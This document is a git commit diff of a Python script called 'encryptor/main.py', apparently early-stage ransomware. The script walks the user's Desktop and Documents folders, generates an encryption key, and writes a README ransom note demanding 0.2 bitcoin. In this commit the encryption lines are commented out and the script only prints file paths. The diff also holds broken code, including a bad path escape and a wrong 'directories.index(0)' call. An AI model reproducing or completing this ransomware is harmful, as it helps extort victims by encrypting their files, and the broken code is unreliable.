d7925234e7c8d6d13a3c359ecaa66a7be2a5acf7
Gonçalo Fernandes <65426418+goncalomf@users.noreply.github.com>
2023-05-27 17:38:22 +0100

    some tweaks

--- encryptor/main.py
+++ encryptor/main.py
@@ -1,18 +1,13 @@
 import os
 import getpass as gt
 from cryptography.fernet import Fernet
-import paramiko as p
 
 
 def main():
     username = gt.getuser()
-    directories = [f'C:/Users/{username}/Desktop/', f'C:/Users/{username}/Documents/']
+    directories = [f'C:\\Users\{username}\\Desktop\\', f'C:\\Users\\{username}\\Documents\\']
     key = Fernet.generate_key()
     F = Fernet(key)
-
-    current_directory = os.getcwd()
-    parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))  # Get the parent directory
-    os.chdir(parent_directory)
 
     for dir in directories:
         if os.path.exists(dir) and os.path.isdir(dir):
@@ -21,15 +16,15 @@ def main():
                     continue
                 if file == "README.txt":
                     continue
-                file_path = os.getcwd() + "/" + dir + file
-                with open(file_path, "rb") as file:
-                    content = file.read()
+                file_path = dir + file
+                # with open(file_path, "rb") as file:
+                #     content = file.read()
                 # e_content = F.encrypt(content)
                 # with open(file_path, "wb") as file:
-                #     file.write(e_content)
+                #      file.write(e_content)
                 print(file_path)
 
-    with open(directories[1] + "README.txt", "w") as file:
+    with open(directories.index(0) + "README.txt", "w") as file:
         file.write(
             f'Your files have been encrypted, send 0.2 bitcoin to my bank account, and I will give you the decryptor. KEY: {key}')
 
